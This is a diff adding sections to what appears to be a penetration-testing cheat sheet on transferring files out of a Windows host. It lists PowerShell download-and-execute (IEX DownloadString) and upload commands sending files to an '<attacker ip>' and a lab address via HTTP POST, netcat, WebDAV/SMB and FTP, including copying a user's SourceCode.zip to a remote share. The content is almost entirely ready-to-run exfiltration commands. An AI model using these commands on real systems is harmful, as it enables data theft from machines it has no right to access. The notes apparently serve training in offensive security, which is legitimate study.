@@ -27,3 +27,65 @@ python3 -m uploadserver
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 Invoke-FileUpload -Uri http://<attacker ip>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 
+---------------------------
+File Transfer - Base64 Web Upload
+---------------------------
+
+1. Encode file in base64
+
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+
+2. Invoke WebRequest to send file in POST method
+
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+
+3. Catch the base64 date with Netcat
+
+nc -lvnp 8000
+echo <base64> | base64 -d -w 0 > hosts
+
+---------------------------
+File Transfer - SMB Upload (WebDav)
+---------------------------
+
+1. Configuring WebDav Server
+- https://github.com/mar10/wsgidav
+
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+
+
+2. Connecting to the Webdav Share
+
+dir \\192.168.49.128\DavWWWRoot
+
+(Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
+You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder)
+
+3. Upload files using SMB
+
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+
+---------------------------
+File Transfer - FTP Upload
+---------------------------
+
+1. Set up FTP server
+
+sudo python3 -m pyftpdlib --port 21 --write
+
+2. Upload file with PS
+
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+
+3. Create command file to upload a file (Optional)
+
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+
+
